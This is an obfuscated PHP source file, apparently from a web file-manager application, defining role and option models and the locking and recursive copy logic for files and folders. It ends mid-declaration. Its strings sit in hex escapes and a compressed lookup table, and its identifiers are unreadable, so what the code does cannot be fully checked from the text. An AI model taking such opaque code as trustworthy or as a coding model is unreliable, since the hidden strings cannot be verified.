<?php
 goto e¤‹ó…Üùõ; E¼º®ğâ£¾: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\155\137\x6f\160\x74\151\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\157\x6c\145", "\162\x6f\154\145\x47\x72\157\x75\160", "\x72\x65\147\x69\163\164", "\145\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ı®Œ£•ƒ) { return "\x53\x79\x73\164\x65\155\117\x70\164\x69\157\x6e\137{$ı®Œ£•ƒ}"; } protected function optionDefault($Í¼À¬ş = '') { $²Î‰¾»£ =& $_SERVER[Á÷ ­Šë]; if ($Í¼À¬ş == $²Î‰¾»£[33]) { return $GLOBALS[$²Î‰¾»£[6]][$²Î‰¾»£[388]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\x72\x6f\x6c\145\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\141\x75\164\150", "\154\x61\142\145\x6c", "\x64\x69\163\x70\x6c\141\171", "\x73\171\x73\x74\x65\x6d", "\144\x65\163\143", "\x69\147\156\157\162\145\x45\x78\x74", "\x69\147\156\x6f\x72\x65\106\x69\x6c\x65\123\151\x7a\145", "\x61\144\x6d\151\156\151\x73\x74\162\141\x74\x6f\162", "\163\157\x72\164"); public function listData($«™ÓÃá¬ = false, $¡òÈÔÈ¾ = "\x73\157\x72\x74", $¹€ßïŒ = false) { $òİÜ“ª· =& $_SERVER[Á÷ ­Šë]; $Øş¾´à” = parent::listData($«™ÓÃá¬, $¡òÈÔÈ¾, $¹€ßïŒ); if (!$«™ÓÃá¬) { foreach ($Øş¾´à” as $•È«¦Õå => $úè“ëÏ×) { if ($úè“ëÏ×[$òİÜ“ª·[1937]] == 1) { $Øş¾´à”[$•È«¦Õå][$òİÜ“ª·[455]] = LNG($òİÜ“ª·[2161]); } } } return $Øş¾´à”; } public function update($¬ÂÒÃ•º, $¦îš¼¢Ü) { $¤÷ÙâÙÖ =& $_SERVER[Á÷ ­Šë]; $«Ú‚êÑ = parent::listData($¬ÂÒÃ•º); $éú§»½• = $this->findByName($¦îš¼¢Ü[$¤÷ÙâÙÖ[28]]); if (!$«Ú‚êÑ || $éú§»½• && $éú§»½•[$¤÷ÙâÙÖ[404]] != $«Ú‚êÑ[$¤÷ÙâÙÖ[404]]) { return !1; } if ($éú§»½•[$¤÷ÙâÙÖ[1937]] == 1) { $¦îš¼¢Ü = array($¤÷ÙâÙÖ[28] => $¦îš¼¢Ü[$¤÷ÙâÙÖ[28]], $¤÷ÙâÙÖ[1764] => $¦îš¼¢Ü[$¤÷ÙâÙÖ[1764]]); } $this->filterAuth($¦îš¼¢Ü[$¤÷ÙâÙÖ[418]]); return parent::update($¬ÂÒÃ•º, $¦îš¼¢Ü); } public function remove($ïÔÅ“€ù) { $æÃÒÏù = parent::listData($ïÔÅ“€ù); if (!$æÃÒÏù || $æÃÒÏù[$_SERVER[Á÷ ­Šë][1202]]) { return !1; } return parent::remove($ïÔÅ“€ù); } public function add($ƒ²§¢•) { $‚ÏÕ¹ø =& $_SERVER[Á÷ ­Šë]; $ï¸¶‚ıã = $ƒ²§¢•[$‚ÏÕ¹ø[28]]; if ($this->findByName($ï¸¶‚ıã)) { return !1; } $ÁÁˆº³· = array($‚ÏÕ¹ø[425] => $ï¸¶‚ıã, $‚ÏÕ¹ø[1748] => $‚ÏÕ¹ø[33], $‚ÏÕ¹ø[1744] => $‚ÏÕ¹ø[1752], $‚ÏÕ¹ø[2162] => 1, $‚ÏÕ¹ø[1747] => 0, $‚ÏÕ¹ø[2163] => 0, $‚ÏÕ¹ø[1746] => $this->getSort()); $ƒ²§¢• = array_merge($ÁÁˆº³·, $ƒ²§¢•); $this->filterAuth($ƒ²§¢•[$‚ÏÕ¹ø[418]]); return parent::insert($ƒ²§¢•); } private function getSort() { $šãùœ˜® =& $_SERVER[Á÷ ­Šë]; $Ü‡ƒ†åı = parent::listData(); $ñÊ„ˆ­ = array_to_keyvalue($Ü‡ƒ†åı, $šãùœ˜®[33], $šãùœ˜®[1765]); return empty($ñÊ„ˆ­) ? 0 : max($ñÊ„ˆ­) + 1; } private function filterAuth(&$¤´Ç£æ») { $µ¶†¦Ü =& $_SERVER[Á÷ ­Šë]; $Ø«ˆŸ®Å = array(); $Ú ıÒ£ä = array_filter(explode($µ¶†¦Ü[47], $¤´Ç£æ»)); foreach ($Ú ıÒ£ä as $¤´Ç£æ») { $¦ØÛÄ„† = explode($µ¶†¦Ü[105], $¤´Ç£æ»); if ($¦ØÛÄ„†[0] == $µ¶†¦Ü[2164] && $¦ØÛÄ„†[1] != $µ¶†¦Ü[1121]) { $¦ìºü²ı = $¦ØÛÄ„†[0] . $µ¶†¦Ü[105] . $¦ØÛÄ„†[1] . $µ¶†¦Ü[2165]; if (!in_array($¦ìºü²ı, $Ú ıÒ£ä)) { $Ø«ˆŸ®Å[] = $¦ìºü²ı; } } $Ø«ˆŸ®Å[] = $¤´Ç£æ»; } $¤´Ç£æ» = implode($µ¶†¦Ü[47], $Ø«ˆŸ®Å); } public function sort($ûŒ¿Øı, $ú«©à¶Š) { return parent::update($ûŒ¿Øı, $ú«©à¶Š); } } goto A›˜Â¤ì­±; Fç”õ©íğÜ: define($_SERVER[Á÷ ­Šë][0], $_SERVER[Á÷ ­Šë][1]); $_SERVER[ãÎ±‚ñ°] = explode($_SERVER[Á÷ ­Šë][2], gzinflate(substr($_SERVER[Á÷ ­Šë][3], 10, -8))); function binCheckEq($©ïø¿î©, $ÈºÉ€Äˆ) { return $©ïø¿î© == $ÈºÉ€Äˆ; } goto E‰ÙØç‚•; a‹°Ôœ’å: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ï³Ú¢´) { $¸ğ²Áß =& $_SERVER[Á÷ ­Šë]; if (!$this->allowLock()) { return; } $this->_lockCheck($¸ğ²Áß[553], $Ï³Ú¢´); $Ô¬ƒÇæÓ = 1; $this->_lockEvent($Ï³Ú¢´, array($¸ğ²Áß[554], $¸ğ²Áß[555]), $Ô¬ƒÇæÓ); $this->_lockParent($Ï³Ú¢´, array($¸ğ²Áß[555]), $Ô¬ƒÇæÓ); $this->_lockEvent($Ï³Ú¢´, array($¸ğ²Áß[556], $¸ğ²Áß[557]), $Ô¬ƒÇæÓ); $this->_lockCheckEnd($¸ğ²Áß[553], $Ï³Ú¢´); } public function lockCopyEnd($òÂûÌÏ») { $ËÕşÂ¥ =& $_SERVER[Á÷ ­Šë]; if (!$this->allowLock()) { return; } $Ó”¢Èº‚ = 0; $this->_lockEvent($òÂûÌÏ», array($ËÕşÂ¥[554], $ËÕşÂ¥[555]), $Ó”¢Èº‚); $this->_lockParent($òÂûÌÏ», array($ËÕşÂ¥[555]), $Ó”¢Èº‚); $this->_lockEvent($òÂûÌÏ», array($ËÕşÂ¥[556], $ËÕşÂ¥[557]), $Ó”¢Èº‚); } public function lockWriteStart($÷õûò°, $‡ÅêŞóõ = '') { $ˆÇÔÆ•è =& $_SERVER[Á÷ ­Šë]; if (!$this->allowLock()) { return; } $this->_lockCheck($ˆÇÔÆ•è[554], $÷õûò°); $‹ğ´‰Áê = 1; $this->_lockKey($ˆÇÔÆ•è[558] . $÷õûò° . $ˆÇÔÆ•è[105] . $‡ÅêŞóõ, $‹ğ´‰Áê); $this->_lockEvent($÷õûò°, array($ˆÇÔÆ•è[553], $ˆÇÔÆ•è[555]), $‹ğ´‰Áê); $this->_lockParent($÷õûò°, array($ˆÇÔÆ•è[553], $ˆÇÔÆ•è[555]), $‹ğ´‰Áê); $this->_lockCheckEnd($ˆÇÔÆ•è[554], $÷õûò°); } public function lockWriteEnd($„÷ŞÑÏ¨, $Òğ•¦í‹ = '') { $‡Ş¹±á =& $_SERVER[Á÷ ­Šë]; if (!$this->allowLock()) { return; } $ÀìÌ‚¦ñ = 0; $this->_lockKey($‡Ş¹±á[558] . $„÷ŞÑÏ¨ . $‡Ş¹±á[105] . $Òğ•¦í‹, $ÀìÌ‚¦ñ); $this->_lockEvent($„÷ŞÑÏ¨, array($‡Ş¹±á[553], $‡Ş¹±á[555]), $ÀìÌ‚¦ñ); $this->_lockParent($„÷ŞÑÏ¨, array($‡Ş¹±á[553], $‡Ş¹±á[555]), $ÀìÌ‚¦ñ); } public function lockMoveStart($©‡ŸÀÇ¥) { $»¥ÎÖÕş =& $_SERVER[Á÷ ­Šë]; if (!$this->allowLock()) { return; } $this->_lockCheck($»¥ÎÖÕş[555], $©‡ŸÀÇ¥); $ß„ìªùé = 1; $this->_lockKey($»¥ÎÖÕş[559] . $©‡ŸÀÇ¥, $ß„ìªùé); $this->_lockEvent($©‡ŸÀÇ¥, array($»¥ÎÖÕş[553], $»¥ÎÖÕş[554]), $ß„ìªùé); $this->_lockParent($©‡ŸÀÇ¥, array($»¥ÎÖÕş[553], $»¥ÎÖÕş[555]), $ß„ìªùé); $this->_lockEvent($©‡ŸÀÇ¥, array($»¥ÎÖÕş[560], $»¥ÎÖÕş[556], $»¥ÎÖÕş[557]), $ß„ìªùé); $this->_lockCheckEnd($»¥ÎÖÕş[555], $©‡ŸÀÇ¥); } public function lockMoveEnd($»Êï˜§ó) { $£É†å¬Ş =& $_SERVER[Á÷ ­Šë]; if (!$this->allowLock()) { return; } $Ÿ‰³òà¥ = 0; $this->_lockKey($£É†å¬Ş[559] . $»Êï˜§ó, $Ÿ‰³òà¥); $this->_lockEvent($»Êï˜§ó, array($£É†å¬Ş[553], $£É†å¬Ş[554]), $Ÿ‰³òà¥); $this->_lockParent($»Êï˜§ó, array($£É†å¬Ş[553], $£É†å¬Ş[555]), $Ÿ‰³òà¥); $this->_lockEvent($»Êï˜§ó, array($£É†å¬Ş[560], $£É†å¬Ş[556], $£É†å¬Ş[557]), $Ÿ‰³òà¥); } private function _lockCheck($±±×î‰, $¹¬ ë¹ı) { $Ä…™ôÈ» =& $_SERVER[Á÷ ­Šë]; $«®Êğ’ = $this->sourceInfo($¹¬ ë¹ı); $¤ñ×¬æÓ = $±±×î‰ . $Ä…™ôÈ»[105] . $¹¬ ë¹ı; $this->_lockTimeStart[$¤ñ×¬æÓ] = timeFloat(); if (!is_array($«®Êğ’)) { return; } $Ã–ÈüÒ = LNG($Ä…™ôÈ»[561]); CacheLock::setErrorMsg($Ä…™ôÈ»[170] . htmlspecialchars($«®Êğ’[$Ä…™ôÈ»[28]]) . $Ä…™ôÈ»[540] . $Ã–ÈüÒ); $this->_lockKey($¤ñ×¬æÓ, 1); $this->_lockKey($¤ñ×¬æÓ, 0); $¢ÇŞí” = array_reverse($this->parentLevelArray($«®Êğ’[$Ä…™ôÈ»[525]])); foreach ($¢ÇŞí” as $õáÃ§«Ù) { $¤ñ×¬æÓ = $±±×î‰ . $Ä…™ôÈ»[562] . $õáÃ§«Ù; if (CacheLock::lockGet($Ä…™ôÈ»[563] . $¤ñ×¬æÓ)) { $«®Êğ’ = $this->sourceInfo($õáÃ§«Ù); CacheLock::setErrorMsg($Ä…™ôÈ»[170] . htmlspecialchars($«®Êğ’[$Ä…™ôÈ»[28]]) . $Ä…™ôÈ»[540] . $Ã–ÈüÒ); $this->_lockKey($¤ñ×¬æÓ, 1); $this->_lockKey($¤ñ×¬æÓ, 0); } } } private function _lockCheckEnd($İ´©ö¥, $ƒ¯¦èÛ´) { $¶Ãñ¦µŸ =& $_SERVER[Á÷ ­Šë]; $ÜËÒáŒ = $İ´©ö¥ . $¶Ãñ¦µŸ[105] . $ƒ¯¦èÛ´; CacheLock::setErrorMsg($¶Ãñ¦µŸ[385]); if (!isset($this->_lockTimeStart[$ÜËÒáŒ])) { return; } $ˆÉÏãŞ• = timeFloat() - $this->_lockTimeStart[$ÜËÒáŒ]; unset($this->_lockTimeStart[$ÜËÒáŒ]); if ($ˆÉÏãŞ• > 0.5) { unset(self::$cacheSourceInfo[$¶Ãñ¦µŸ[462] . $ƒ¯¦èÛ´]); } $ß×§ôôİ = $this->sourceInfo($ƒ¯¦èÛ´); if (!$ß×§ôôİ) { show_json(LNG($¶Ãñ¦µŸ[115]), !1); } } private function _lockParent($âÛĞŠÂ…, $ÂåÛ²¶†, $‘Úï¹šÃ) { if (!$this->autoLockSet) { return; } $Ïàäªµ = $this->sourceInfo($âÛĞŠÂ…); if (!is_array($Ïàäªµ)) { return; } $‘¶„çÖÁ = array_reverse($this->parentLevelArray($Ïàäªµ[$_SERVER[Á÷ ­Šë][525]])); foreach ($‘¶„çÖÁ as $ë×éº§±) { $this->_lockEvent($ë×éº§±, $ÂåÛ²¶†, $‘Úï¹šÃ); } } private function _lockEvent($äêğêª¯, $şÂóÁ·, $Ş¡ì«‡ı) { $½óÜªñß =& $_SERVER[Á÷ ­Šë]; if (!$this->autoLockSet) { return; } foreach ($şÂóÁ· as $º¡ÚÁ) { $İşÛ…ª· = $º¡ÚÁ . $½óÜªñß[105] . $äêğêª¯; if ($Ş¡ì«‡ı && CacheLock::lockGet($½óÜªñß[563] . $İşÛ…ª·)) { continue; } $this->_lockKey($İşÛ…ª·, $Ş¡ì«‡ı); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($‡ÄÔŸ˜’, $ğÎé‹· = 1) { $Áê÷”ó… = $_SERVER[Á÷ ­Šë][563] . md5($‡ÄÔŸ˜’); if ($ğÎé‹·) { if (isset(self::$_lockItemArr[$Áê÷”ó…])) { return; } self::$_lockItemArr[$Áê÷”ó…] = 1; CacheLock::lock($Áê÷”ó…, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Áê÷”ó…])) { return; } unset(self::$_lockItemArr[$Áê÷”ó…]); CacheLock::unlock($Áê÷”ó…); } } public function isParentOf($Õ™‰¢í», $Âİ£òàà) { $í¦¨û¿³ =& $_SERVER[Á÷ ­Šë]; $Œë­Àä = $this->sourceInfo($Õ™‰¢í»); $Ô¾±íÄÊ = $this->sourceInfo($Âİ£òàà); $¥¦Îú’Ê = $Œë­Àä[$í¦¨û¿³[525]] . $Œë­Àä[$í¦¨û¿³[407]] . $í¦¨û¿³[47]; $ŞÔ»Ôä = $Ô¾±íÄÊ[$í¦¨û¿³[525]] . $Ô¾±íÄÊ[$í¦¨û¿³[407]] . $í¦¨û¿³[47]; $ÒÑê®™± = strpos($ŞÔ»Ôä, $¥¦Îú’Ê) === 0; return $ÒÑê®™±; } private $targetIsDelete = 0; public function copy($ùÒû”ßá, $ãÅØíæ¿, $â®‹ªµ¦ = REPEAT_REPLACE, $²¥£ˆŠ = '') { $¾ùı½Â =& $_SERVER[Á÷ ­Šë]; $´çİ€ßœ = $this->sourceInfo($ùÒû”ßá); $äŒé¹é = $this->sourceInfo($ãÅØíæ¿); if (!$´çİ€ßœ || !$äŒé¹é || $äŒé¹é[$¾ùı½Â[415]] != $¾ùı½Â[97]) { return !1; } if ($this->isParentOf($ùÒû”ßá, $ãÅØíæ¿)) { return !1; } $èƒæ‘ùÚ = $²¥£ˆŠ ? $²¥£ˆŠ : $´çİ€ßœ[$¾ùı½Â[28]]; $this->lockCopyStart($ùÒû”ßá); $this->lockWriteStart($ãÅØíæ¿, $èƒæ‘ùÚ); $óªÒ•— = array($¾ùı½Â[564] => array(), $¾ùı½Â[565] => array(), $¾ùı½Â[566] => array()); $this->targetIsDelete = intval($´çİ€ßœ[$¾ùı½Â[435]]); $©ü Ë˜™ = $this->fileNameExistCache($ãÅØíæ¿, $´çİ€ßœ[$¾ùı½Â[28]]); $Î£«¼‹í = $this->_copy($ùÒû”ßá, $ãÅØíæ¿, $â®‹ªµ¦, $óªÒ•—, !0, $²¥£ˆŠ); $this->_childrenListClear(); $this->lockCopyEnd($ùÒû”ßá); $this->lockWriteEnd($ãÅØíæ¿, $èƒæ‘ùÚ); if ($´çİ€ßœ[$¾ùı½Â[415]] == $¾ùı½Â[97] && $©ü Ë˜™ == $Î£«¼‹í) { $this->folderSizeResetChildren($©ü Ë˜™); } Model($¾ùı½Â[567])->addAll($óªÒ•—[$¾ùı½Â[565]], array(), !0); if ($©ü Ë˜™ != $Î£«¼‹í || $´çİ€ßœ[$¾ùı½Â[415]] == $¾ùı½Â[97]) { Model($¾ùı½Â[568])->eventCopy($Î£«¼‹í); } $this->saveAll($óªÒ•—[$¾ùı½Â[566]]); Model($¾ùı½Â[203])->linkAdd($óªÒ•—[$¾ùı½Â[564]]); $this->folderSizeReset($ãÅØíæ¿); $this->updateModifyTime($ãÅØíæ¿); return $Î£«¼‹í; } private function _copy($¨§‹Î³ê, $”÷âó«¨, $ÒÒßÒë, &$Ÿ­èæŞá, $¬ìµø×, $ŠÔ°‡úã = '') { $¹æ„£é× =& $_SERVER[Á÷ ­Šë]; $ôÓ¥èİõ = $this->sourceInfoCache($¨§‹Î³ê); $Ò²ì€¹” = $ôÓ¥èİõ[$¹æ„£é×[415]] == $¹æ„£é×[97]; $ã †Şˆ¡ = $ŠÔ°‡úã ? $ŠÔ°‡úã : $ôÓ¥èİõ[$¹æ„£é×[28]]; $³ë•ôã¼ = $this->fileNameExistCache($”÷âó«¨, $ã †Şˆ¡); if ($¬ìµø×) { $this->_childrenAllMake($¨§‹Î³ê); if ($Ò²ì€¹” && $³ë•ôã¼) { $this->_childrenAllMake($³ë•ôã¼); } } if (!$³ë•ôã¼) { return $this->_copyCreate($¨§‹Î³ê, $”÷âó«¨, $ã †Şˆ¡, $Ÿ­èæŞá); } $ÖĞõœœ = $³ë•ôã¼; if ($Ò²ì€¹”) { if ($ÒÒßÒë == REPEAT_RENAME_FOLDER) { $ã †Şˆ¡ = $this->fileNameAutoCache($”÷âó«¨, $ã †Şˆ¡, $ÒÒßÒë, $Ò²ì€¹”); $ÖĞõœœ = $this->_copyCreate($¨§‹Î³ê, $”÷âó«¨, $ã †Şˆ¡, $Ÿ­èæŞá); } else { $ŒºÎƒã“ = $this->_childrenList($¨§‹Î³ê); foreach ($ŒºÎƒã“ as $Ÿæˆ“î) { $this->_copy($Ÿæˆ“î[$¹æ„£é×[407]], $³ë•ôã¼, $ÒÒßÒë, $Ÿ­èæŞá, !1); } } } else { if ($ÒÒßÒë == REPEAT_RENAME || $ÒÒßÒë == REPEAT_RENAME_FOLDER) { $ã †Şˆ¡ = $this->fileNameAutoCache($”÷âó«¨, $ã †Şˆ¡, $ÒÒßÒë, $Ò²ì€¹”); $ÖĞõœœ = $this->_copyCreate($¨§‹Î³ê, $”÷âó«¨, $ã †Şˆ¡, $Ÿ­èæŞá); } else { if ($ÒÒßÒë == REPEAT_REPLACE) { $¬¹î±Ç˜ = $this->sourceInfoCache($³ë•ôã¼); $Ï¬öš­ = $this->fileHistory($¬¹î±Ç˜, $ôÓ¥èİõ[$¹æ„£é×[471]], $ôÓ¥èİõ[$¹æ„£é×[88]]); if ($Ï¬öš­) { $Ÿ­èæŞá[$¹æ„£é×[564]][] = $ôÓ¥èİõ[$¹æ„£é×[471]]; } } else { if ($ÒÒßÒë == REPEAT_SKIP) { } } } Hook::trigger($¹æ„£é×[569], array($¹æ„£é×[570], $ôÓ¥èİõ, 0)); } return $ÖĞõœœ; } private function _copyCreate($ÜöÜ‚×á, $ÉÒä„ç‚, $×¥ş¨‚˜, &$˜ƒïÚ„) { $±ÜÜñàÑ =& $_SERVER[Á÷ ­Šë]; $ ß°ßšö = $this->sourceInfoCache($ÜöÜ‚×á); $áüÚÜÈî = $this->sourceInfoCache($ÉÒä„ç‚); $óõ×ºÃ = $this->_makeItemData($ ß°ßšö, $áüÚÜÈî, $×¥ş¨‚˜); Hook::trigger($±ÜÜñàÑ[571], $óõ×ºÃ); Hook::trigger($±ÜÜñàÑ[572], array($±ÜÜñàÑ[573], $óõ×ºÃ, 0)); $ÚÚ«‚Â = $this->add($óõ×ºÃ); $£Ô‹è­… = array($±ÜÜñàÑ[407] => $ÚÚ«‚Â, $±ÜÜñàÑ[28] => $×¥ş¨‚˜); $this->_copyApplyMeta($£Ô‹è­…, $˜ƒïÚ„); if ($ ß°ßšö[$±ÜÜñàÑ[415]] != $±ÜÜñàÑ[97]) { $˜ƒïÚ„[$±ÜÜñàÑ[564]][] = $ ß°ßšö[$±ÜÜñàÑ[471]]; return $ÚÚ«‚Â; } $ä”­Ã«š = array(); $Û¦™ÜÕ— = array(); $this->_childrenListAll($ÜöÜ‚×á, $ä”­Ã«š); $¼¨û¦’ = count($ä”­Ã«š); if ($¼¨û¦’ == 0) { return $ÚÚ«‚Â; } $İÚîü­È = $this->sourceInfo($ÚÚ«‚Â); foreach ($ä”­Ã«š as $ÌÌğ¦) { $£½ÇÛõä = $this->_makeItemData($ÌÌğ¦, $İÚîü­È, $ÌÌğ¦[$±ÜÜñàÑ[28]]); $£½ÇÛõä[$±ÜÜñàÑ[525]] = $ÌÌğ¦[$±ÜÜñàÑ[525]]; $Û¦™ÜÕ—[] = $£½ÇÛõä; } $this->chunkEventSet($±ÜÜñàÑ[574], array($±ÜÜñàÑ[575], $óõ×ºÃ, $¼¨û¦’)); $this->addAll($Û¦™ÜÕ—, array(), !1); $¦ÊüĞ¦ = $this->where(array($±ÜÜñàÑ[502] => $ÚÚ«‚Â))->select(); $ùäĞ„ Ë = $this->_childrenMakeRelation($ä”­Ã«š, $¦ÊüĞ¦); $ùäĞ„ Ë[$ÜöÜ‚×á] = $ÚÚ«‚Â; $šŸ¾È­Î = array(); $—ßÃ˜¶ = array(); foreach ($¦ÊüĞ¦ as $ÌÌğ¦) { $µ˜áß = $ÌÌğ¦[$±ÜÜñàÑ[407]]; $ÅŒê¾Ûš = $this->_childrenMatch($ùäĞ„ Ë, $ÌÌğ¦, $İÚîü­È); $šŸ¾È­Î[] = array($±ÜÜñàÑ[407], $µ˜áß, $±ÜÜñàÑ[502], $ÅŒê¾Ûš[$±ÜÜñàÑ[502]]); $—ßÃ˜¶[] = array($±ÜÜñàÑ[407], $µ˜áß, $±ÜÜñàÑ[525], $ÅŒê¾Ûš[$±ÜÜñàÑ[525]]); $this->_copyApplyMeta($ÌÌğ¦, $˜ƒïÚ„); if ($ÌÌğ¦[$±ÜÜñàÑ[415]] != $±ÜÜñàÑ[97]) { $˜ƒïÚ„[$±ÜÜñàÑ[564]][] = $ÌÌğ¦[$±ÜÜñàÑ[471]]; } } $this->chunkEventSet($±ÜÜñàÑ[576], array($±ÜÜñàÑ[577], $óõ×ºÃ, $¼¨û¦’)); $this->saveAll($šŸ¾È­Î); $this->chunkEventSet($±ÜÜñàÑ[578], array($±ÜÜñàÑ[579], $óõ×ºÃ, $¼¨û¦’)); $this->saveAll($—ßÃ˜¶); return $ÚÚ«‚Â; } private function _childrenMakeRelation($øÍÊÈ·ù, $åğÛœ²÷) { $¦Ìó®¶ =& $_SERVER[Á÷ ­Šë]; $Õ®³³À¬ = array(); $ƒÌòø² = array(); foreach ($øÍÊÈ·ù as $£¨ğä†É) { $‚›ÎŞÍŠ = $£¨ğä†É[$¦Ìó®¶[28]] . $¦Ìó®¶[8] . $£¨ğä†É[$¦Ìó®¶[525]]; $Õ®³³À¬[$‚›ÎŞÍŠ] = $£¨ğä†É[$¦Ìó®¶[407]]; } foreach ($åğÛœ²÷ as $£¨ğä†É) { $‚›ÎŞÍŠ = $£¨ğä†É[$¦Ìó®¶[28]] . $¦Ìó®¶[8] . $£¨ğä†É[$¦Ìó®¶[525]]; $¨ÂÚåĞ = $Õ®³³À¬[$‚›ÎŞÍŠ]; $ƒÌòø²[$¨ÂÚåĞ] = $£¨ğä†É[$¦Ìó®¶[407]]; } return $ƒÌòø²; } private function _childrenMatch($ÛÙ¿ÔËà, $¼ˆ‘©ƒª, $Ç‚¼§è‡) { $Æ…ÆÛ =& $_SERVER[Á÷ ­Šë]; $êæ¬‘øı = $Ç‚¼§è‡[$Æ…ÆÛ[525]]; $Êóƒôç° = $this->parentLevelArray($¼ˆ‘©ƒª[$Æ…ÆÛ[525]]); foreach ($Êóƒôç° as $ë¦šô–) { if (isset($ÛÙ¿ÔËà[$ë¦šô–])) { $êæ¬‘øı .= $ÛÙ¿ÔËà[$ë¦šô–] . $Æ…ÆÛ[580]; } } $êæ¬‘øı = rtrim($êæ¬‘øı, $Æ…ÆÛ[47]) . $Æ…ÆÛ[47]; $…å¸Ğº† = $this->parentLevelArray($êæ¬‘øı); $å€‹Á€ = $…å¸Ğº†[count($…å¸Ğº†) - 1]; return array($Æ…ÆÛ[502] => $å€‹Á€, $Æ…ÆÛ[525] => $êæ¬‘øı); } private function _makeItemData($Øå­§‹œ, $§·ÈÎçæ, $­’ĞØÈß) { $«íø‰³× =& $_SERVER[Á÷ ­Šë]; $æªÏÈ§  = array($«íø‰³×[581] => $Øå­§‹œ[$«íø‰³×[415]], $«íø‰³×[425] => $­’ĞØÈß, $«íø‰³×[582] => $Øå­§‹œ[$«íø‰³×[417]] ? $Øå­§‹œ[$«íø‰³×[417]] : $«íø‰³×[33], $«íø‰³×[472] => $Øå­§‹œ[$«íø‰³×[471]] ? $Øå­§‹œ[$«íø‰³×[471]] : 0, $«íø‰³×[583] => $Øå­§‹œ[$«íø‰³×[88]] ? $Øå­§‹œ[$«íø‰³×[88]] : 0, $«íø‰³×[584] => intval($§·ÈÎçæ[$«íø‰³×[416]]), $«íø‰³×[585] => intval($§·ÈÎçæ[$«íø‰³×[508]]), $«íø‰³×[586] => intval(USER_ID), $«íø‰³×[587] => intval(USER_ID), $«íø‰³×[406] => intval($§·ÈÎçæ[$«íø‰³×[407]]), $«íø‰³×[588] => $§·ÈÎçæ[$«íø‰³×[525]] . $§·ÈÎçæ[$«íø‰³×[407]] . $«íø‰³×[47], $«íø‰³×[429] => $Øå­§‹œ[$«íø‰³×[94]] ? $Øå­§‹œ[$«íø‰³×[94]] : time(), $«íø‰³×[434] => 0, $«íø‰³×[589] => $«íø‰³×[33]); return $æªÏÈ§ ; } private function _copyApplyMeta($«­ˆÅºÒ, &$š£´µÂë) { $Ö•—¢—  =& $_SERVER[Á÷ ­Šë]; $õÒñ• = $«­ˆÅºÒ[$Ö•—¢— [407]]; $ÕÄ…¸¼« = $«­ˆÅºÒ[$Ö•—¢— [28]]; if (!isset($«­ˆÅºÒ[$Ö•—¢— [590]]) || !$«­ˆÅºÒ[$Ö•—¢— [590]] || $«­ˆÅºÒ[$Ö•—¢— [590]] == $Ö•—¢— [201]) { $š£´µÂë[$Ö•—¢— [566]][] = array($Ö•—¢— [407], $õÒñ•, $Ö•—¢— [590], short_id($õÒñ•)); } if (Input::check($ÕÄ…¸¼«, $Ö•—¢— [591])) { $š£´µÂë[$Ö•—¢— [565]][] = array($Ö•—¢— [407] => $õÒñ•, $Ö•—¢— [103] => $Ö•—¢— [468], $Ö•—¢— [381] => str_replace($Ö•—¢— [50], $Ö•—¢— [33], Pinyin::get($ÕÄ…¸¼«))); $š£´µÂë[$Ö•—¢— [565]][] = array($Ö•—¢— [407] => $õÒñ•, $Ö•—¢— [103] => $Ö•—¢— [467], $Ö•—¢— [381] => Pinyin::get($ÕÄ…¸¼«, $Ö•—¢— [592])); } $š£´µÂë[$Ö•—¢— [565]][] = array($Ö•—¢— [407] => $õÒñ•, $Ö•—¢— [103] => $Ö•—¢— [446], $Ö•—¢— [381] => KodSort::makeStr($ÕÄ…¸¼«)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($å°¨Ü§´) { $ôÖÌ‰ =& $_SERVER[Á÷ ­Šë]; $›ü¥Š˜Ü = $this->sourceInfo($å°¨Ü§´); $ş¢»±â = $ôÖÌ‰[593]; $¢¹ñİö¼ = array($ôÖÌ‰[525] => array($ôÖÌ‰[548], $›ü¥Š˜Ü[$ôÖÌ‰[525]] . $å°¨Ü§´ . $ôÖÌ‰[549]), $ôÖÌ‰[435] => $this->targetIsDelete); $í¾Ò¨£¼ = $this->field($ş¢»±â)->where($¢¹ñİö¼)->select(); if (!$í¾Ò¨£¼) { return; } $í¾Ò¨£¼ = array_to_keyvalue($í¾Ò¨£¼, $ôÖÌ‰[407]); foreach ($í¾Ò¨£¼ as $è·ğ¶È) { $Ô Øé¾£ = $è·ğ¶È[$ôÖÌ‰[502]]; $å°¨Ü§´ = $è·ğ¶È[$ôÖÌ‰[407]]; if (!isset($this->_childrenListCache[$å°¨Ü§´]) && $è·ğ¶È[$ôÖÌ‰[415]] == $ôÖÌ‰[97]) { $this->_childrenListCache[$å°¨Ü§´] = array(); } if (!isset($this->_childrenListCache[$Ô Øé¾£])) { $this->_childrenListCache[$Ô Øé¾£] = array(); } $this->_childrenListCache[$Ô Øé¾£][$å°¨Ü§´] = $è·ğ¶È; $this->_childrenItemCache[$å°¨Ü§´] = $è·ğ¶È; } } private function _childrenListAll($áÅ“©ªÃ, &$Ä¶˜”©Ş) { $çªè†à =& $_SERVER[Á÷ ­Šë]; if (!isset($this->_childrenListCache[$áÅ“©ªÃ])) { return; } $éĞÑÌ³› = $this->_childrenListCache[$áÅ“©ªÃ]; foreach ($éĞÑÌ³› as $§±Ã‰Çœ => $öÒ“ôº) { $Ä¶˜”©Ş[$§±Ã‰Çœ] = $öÒ“ôº; if ($öÒ“ôº[$çªè†à[415]] == $çªè†à[97]) { $this->_childrenListAll($§±Ã‰Çœ, $Ä¶˜”©Ş); } } } private function sourceInfoCache($È­¨Ö‘ò) { if (isset($this->_childrenItemCache[$È­¨Ö‘ò])) { return $this->_childrenItemCache[$È­¨Ö‘ò]; } return $this->sourceInfo($È­¨Ö‘ò); } private function _childrenList($£Â¹†òú) { if (isset($this->_childrenListCache[$£Â¹†òú])) { return $this->_childrenListCache[$£Â¹†òú]; } return $this->_childrenListSelect($£Â¹†òú); } private function 